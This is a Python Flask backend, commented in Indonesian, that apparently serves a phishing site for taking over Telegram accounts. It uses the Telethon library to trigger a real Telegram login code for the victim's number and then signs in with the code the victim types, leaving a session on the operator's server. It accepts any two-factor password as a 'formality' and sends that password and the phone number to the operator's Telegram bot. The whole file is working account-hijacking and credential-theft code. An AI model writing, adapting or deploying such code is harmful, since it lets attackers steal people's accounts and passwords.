
import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Izinkan akses dari domain Netlify kamu
CORS(app, resources={r"/*": {"origins": "*"}})

# Ambil variabel dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim OTP ASLI (Validasi Nomor)
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP ASLI & Cek apakah butuh Sandi
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                # Jika lolos tanpa sandi
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Jika akun punya 2FA, arahkan website ke halaman Sandi
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                # Jika OTP salah, tetap beri peringatan salah
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Sandi Formalitas (AUTO-LOLOS)
        elif step == 3:
            # Kita TIDAK memvalidasi sandi ke Telegram agar tidak Error 500
            # Apapun yang diketik, kita anggap sukses agar target pindah ke halaman loading
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            msg = f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}"
            requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
            
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.after_request
def add_headers(response):
    """Menghilangkan pesan merah CORS di konsol"""
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
    data = request.json
    try:
        # Gunakan asgiref untuk menjalankan Telethon di Flask
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        return make_response(jsonify({"status": "error", "message": str(e)}), 500)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)